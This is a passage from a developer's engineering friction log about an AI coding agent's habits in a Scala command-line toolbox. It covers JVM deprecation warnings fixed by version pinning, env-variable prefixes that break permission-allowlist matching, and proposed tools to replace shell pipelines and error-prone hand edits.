reflexively prepended is itself a **non-allowlistable env-assignment inside the gated command** (cf. the cross-repo
entry above). Two better paths: (1) **export `TT_TOOLS` once in the environment** — approved settings `env` block or
`.bashrc` + the [[exit-resume-dance]] — so every `tt` call is **bare and allowlistable**, no per-call prefix, no
decision (the env-*inheritance* principle from Finding A); (2) the real tool-side fix, **walk-up-from-cwd
discovery**. **NB:** for `tt text` specifically NEITHER is needed — `text.scala` is propagated to the work repo, so
bare `tt text grepr` resolves; the prefix here was pure over-caution, an *extra* self-inflicted friction on top of
the arg-order one.

---

## JVM `sun.misc.Unsafe` deprecation noise on every `tt`/scala-cli call (2026-07-03, BR-flagged "WR data")

*(Target inferred from the immediate output — BR flagged this tersely right after two `tt git` commits whose only
notable feature was four WARNING lines each; correct me if a different datapoint was meant.)*

**Symptom.** Every `tt <tool>` (and every bare `scala-cli run`) prints, unconditionally, to stderr:
`WARNING: A terminally deprecated method in sun.misc.Unsafe has been called … objectFieldOffset … will be removed
in a future release … Please consider reporting this to the maintainers of scala.runtime.LazyVals$`. Four lines,
every invocation, from **JVM 25 + scala-library internals** — nothing to do with the tool being run.

**Why it costs (cry-wolf).** The lines are (a) **high-frequency** — they ride on literally every tool call; (b)
**alarming-sounding** — "terminally deprecated", "will be removed", "report this to the maintainers" reads like an
action item; (c) **not actionable by us** — it's `scala.runtime.LazyVals$` in the stdlib on JDK 25, fixed only by a
future Scala/JDK, not by our code. So they train the reader (human and agent) to **skim past WARNING lines** — the
same desensitization family as the guard-jargon reason-strings and the "0 errors" false-positive thread: a loud
signal that is almost always noise erodes attention for the rare real one. It also **buries the tool's actual
output** in the scrollback and inflates every transcript.

**The tension with our own rule.** memory + skills/scala-style say *do not `2>/dev/null`; tolerate benign JVM
warnings* — precisely so we don't mask real stderr. But that rule assumed benign warnings are **rare**; here they
are **per-call and constant**, so "tolerate" degrades into "ignore all stderr," which is the failure mode the rule
exists to prevent. Blanket suppression is wrong (hides real warnings); doing nothing is wrong (cry-wolf). The gap is
that neither pole fits a **known-benign, known-constant, known-un-actionable** source.

**Root cause + fix (FOUND + applied 2026-07-03).** The warning is **JVM-version-gated**, and the noise was
**self-inflicted config drift**: JDK 25 terminally-deprecates `sun.misc.Unsafe`, JDK 21 (LTS) does not. Tools that
declare `//> using jvm 21` (box/chrono/typo/… — most of them) run silent; the only offenders were **`git.scala` and
`parsereqt.scala`, which were missing the `//> using jvm 21` line** and so ran on the *system* JVM 25 — hence the
four lines on every `tt git` commit. **Fix:** add `//> using jvm 21` to those two, matching the rest of the
toolbox. No stderr suppression, no launch flag. (An earlier guess — `--java-opt=--sun-misc-unsafe-memory-access=allow`
— was tested and **REJECTED** by this JDK, `Unrecognized option`; recorded here so it isn't retried. The right lever
was the version pin, not a flag.) Lesson: a missing `//> using jvm` silently falls back to whatever JDK is on PATH,
so pin it in every tool. The native-`tt`-binary path ([[DESIGN-single-dispatcher]]) removes the whole class later.

## The `export TT_TIME=0;` prefix reflex (2026-07-03, BR-flagged "why export TT_TIME=0?")

**Symptom.** The agent prepended `export TT_TIME=0; ` to its `tt git` calls (to hide `tt`'s per-invocation timing
line, `tt git: N.NNNs`). BR flagged it. **Double anti-pattern:** (1) `export VAR=0; <cmd>` is an env-assignment
composed with `;` *inside the gated command* — **non-allowlistable and guard-shaped**, the identical family already
logged for the `TT_TOOLS=` prefix reflex above (a bare `tt git …` matches `Bash(tt git *)`; the env-prefixed form
does not). (2) It **suppresses telemetry the tool emits on purpose** — the timing line + `tt-perf.tsv` append are
"feedback kind b", the very perf data the toolbox exists to gather; silencing it defeats the instrument.

**Why it happened.** Carried over from smoke-testing (where the timing line was noise in a `grep`) into commits by
reflex — output-tidying over-optimization, the same impulse as the `sed`/pipe-to-head reflexes. The timing line is
**not clutter to hide**; on a real commit it's signal.

**Fix (in-hand).** Run **bare `tt git …`** — let the timing line print and log. If the perf timing ever genuinely
needs disabling, set `TT_TIME` in the **human environment** (export once, or settings `env`), never as a per-call
prefix on the gated command — same env-*inheritance*-not-per-call-prefix rule as `TT_TOOLS`. General reflex to kill:
**never prepend an env-assignment to a `tt` call**; if a tool needs config, it reads it from the inherited env. (b) This is another argument for the **native `tt` binary** ([[DESIGN-single-dispatcher]]):
a compiled binary doesn't route through the scala-cli/JVM-warning path at all — it sidesteps the whole issue without
needing to find the flag. (c) **Agent-side (in-hand now):** state plainly that these four lines are inert
JVM-internal noise and do **not** treat them as findings — do not confabulate an action from them.

## `grep | awk -F'\t' | sort | tail` on the results TSV → `tt tsv` tool candidate (2026-07-04, BR-flagged)

**Symptom.** Exploring `results-bigrun.tsv` mid-sweep, the agent reached for chained shell —
`grep MODEL file | awk -F'\t' '$6!="FAIL_NORESP"{print $7}' | sort -n | tail` — to pull one column, filter by
another, and show extremes. BR: *"lots of chained grep and awk — should we have tools for this?"* Yes: this is the
bash-hack reflex (non-allowlistable pipe chain, fragile field-splitting, the exact class `prefer-scala-scratch` /
`grepr` retire), and TSV column analysis is a recurring need (every result-file exploration, the WR1 analysis).

**Tool candidate — `tt tsv`** (typed TSV/columnar ops, one allowlistable call instead of a pipe chain):
- `select <cols>` (by name from the header, not `$7`), `filter <col><op><val>` (eq/ne/gt/lt), `head/tail N`,
- `count` / `group <col> count` (frequency of grades per model/style — the core sweep question),
- `stats <col>` (n/min/max/mean/median/quantiles — e.g. out_tokens by model).
Header-aware (reference columns by name), tab-safe, prints a clean table + a verdict line. Would have answered
"reasoning-model out_tokens vs fast-model" in one call, and directly serves WR1 result exploration. Fits the
[[DESIGN-single-dispatcher]] typed-args direction (a natural leaf tool: pure read → compute → print). **Not built
now** (tools held in safe state pending the dispatcher refactor) — logged as a high-value candidate; propose adding
it when the toolbox reopens.

## `printf > file` and `echo "===" ; …` reflexes → Write tool + a `tt sweep-status` (2026-07-04, BR-flagged)

BR (watching the gray command previews): *"you did a lot of printf; is this a candidate for a tool?"* Two distinct
reflexes:
- **`printf '%s' … > msgfile`** to create a commit-message file — a *slip*, not a tool gap: the **Write tool** is
  the clean path (no shell, any metachars, allowlistable) and is what's used for nearly every other commit; the
  inline `printf >` crept in once for speed. Fix = discipline: always Write the message file, never `printf`/`echo >`.
- **`echo "=== … ===" ; wc -l … ; tail … ; grep …`** — the labeled-multipart-status compound run every monitor
  tick. THIS is a real candidate: hand-assembling status via `echo` separators + a `;`-chain is non-allowlistable
  and repetitive. → **`tt sweep-status`** leaf tool (TSV row count + current-model tail + `tt box gpu`, one formatted
  call) and the already-proposed **`tt tsv`**. Both are clean [[DESIGN-single-dispatcher]] leaf tools (pure-ish,
  self-labeling output) — build when the toolbox reopens. General rule: if a bash compound exists only to *label and
  glue* several outputs, that's a tool boundary, not a shell pipeline.

## Hand-Edit boundary-newline drop → newline-safe block-op tool (2026-07-06, BR-flagged)

**Symptom.** Two pinboard list items (`OD08`, `OD10`) rendered welded into one long line — the `\n` separating them
was gone (`…consistency dance naming.- **OD10 …`). BR, reading the pinboard, caught it.

**Root cause.** Introduced by a hand-Edit in an earlier commit: an `OD09 → CD09` migration removed OD09, which had
sat *between* OD08 and OD10; the `old_string`/`new_string` pair dropped the boundary `\n`, welding OD08's tail onto
OD10's bullet. The rendered diff **looked right** — a missing newline is invisible in a diff — so it survived to
BR's eyeball. One-line fix commit.

**Class.** An exact-string Edit *across a deletion/insertion boundary* can silently drop the boundary newline. It is
the authoring cousin of the command-bundling problem: the hazard lives at the **seam**, not in the visible content.

**Two mitigations.**
- **(observed, works) rebuild-and-rejoin scratch** — a scala-cli scratch that reads lines, transforms the list, and
  `join("\n")`s **cannot** weld two lines: boundary newlines are structural invariants of the line model, not
  characters you can fumble. This is exactly why the same session's `band-solo-menu.scala` regroup was newline-safe
  while the hand-Edit was not — a concrete point in favour of the scala-scratch discipline for structural
  line-surgery.
- **(candidate — WR-TOOL) `tt text` block-op family** — atomic, marker-addressed line ops on the line model:
  `insert-after <marker>`, `delete-block <marker|range>`, `split-before <marker>`, `move-block`. Read → op →
  `join("\n")` → write, so newlines are invariants by construction; a bare `tt text …` call is allowlistable (matters
  for AFK prompt-race-freeness); ship with an idempotency + no-glue lint (cousin of the roadmapped `greprRegexLint`).

**Earn-its-place test.** Scratches already cover one-off structural edits. The tool wins only when the op is
(i) **atomic + frequent** (insert/delete a marked block is the common shape), (ii) worth **bare-allowlisting** so an
AFK run needs no scratch-compile, and (iii) shippable with a **verify** (idempotent, zero dangling glue). Until then:
use a rebuild-and-rejoin scratch for any multi-line structural edit, and treat a hand-Edit across a delete/insert
seam as newline-risky (eyeball the seam, or grep for `.- **`-style glue afterward). Fits
[[DESIGN-single-dispatcher]] (leaf tool: pure read → transform → write).
